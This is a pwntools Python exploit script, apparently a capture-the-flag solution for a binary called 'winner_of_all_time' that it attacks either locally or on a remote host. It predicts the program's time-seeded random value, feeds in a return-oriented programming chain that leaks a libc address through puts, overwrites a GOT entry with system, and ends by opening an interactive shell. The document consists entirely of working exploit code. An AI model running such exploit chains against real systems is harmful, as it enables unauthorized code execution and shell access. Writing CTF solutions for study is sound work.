from pwn import *
from ctypes import*
if args.LOCAL:
    io=process('./winner_of_all_time')
    if args.GDB:
        cmd="""
        init-pwndbg
        b* 0x0000000000401589
        """
        gdb.attach(io, cmd)
else:
    io=remote('157.245.147.89', 22772)
libc=ELF('./libc.so.6')
elf=context.binary=ELF('./winner_of_all_time')        
glibc = cdll.LoadLibrary('./libc.so.6')


pop_rdi=0x0000000000401589
pop_rsi_r15=0x0000000000401596
ret=0x000000000040101a
pop_rbp_ret=0x000000000040133e
leave_ret=0x00000000004013ac
glibc.srand(glibc.time(None))
qword_4040D0 = glibc.rand() % 123456789
print(qword_4040D0)

for i in range(22):
    io.sendline(str(10).encode())

rbp=0x404b00
io.sendline(str(rbp).encode())

add_nop_ret=0x000000000040127c
mov_rbx=0x00000000004013a8
scanf=0x404060
d=0x000000000040270F
pl=p64(pop_rdi)
pl+=p64(elf.got.puts)
pl+=p64(elf.sym.puts)
pl+=p64(ret)
pl+=p64(pop_rdi)
pl+=p64(d)
pl+=p64(pop_rsi_r15)
pl+=p64(0x404f00)
pl+=p64(0)
pl+=p64(0x000000000401180)
pl+=p64(ret)
pl+=p64(pop_rdi)
pl+=p64(d)
pl+=p64(pop_rsi_r15)
pl+=p64(0x404018)
pl+=p64(0)
pl+=p64(ret)
pl+=p64(0x000000000401180)
pl+=p64(pop_rdi)
pl+=p64(0x404f00)
pl+=p64(ret)
pl+=p64(elf.sym.puts)


for i in range(0, len(pl), 8):
    io.sendline(str(u64(pl[i:i+8].ljust(8, b'\0'))).encode())
pause()
io.sendline(str(qword_4040D0).encode())

io.recvuntil(b' Welcome to sanctuary of time')
io.recvline()

libc.address=u64(io.recv(6).ljust(8, b'\0')) - libc.sym.puts
print(hex(libc.address))
og=libc.address+0x1052fa
pause()
io.sendline(str(u32(b'sh\0\0')).encode())
pause()
io.sendline(str(libc.sym.system).encode())
io.interactive()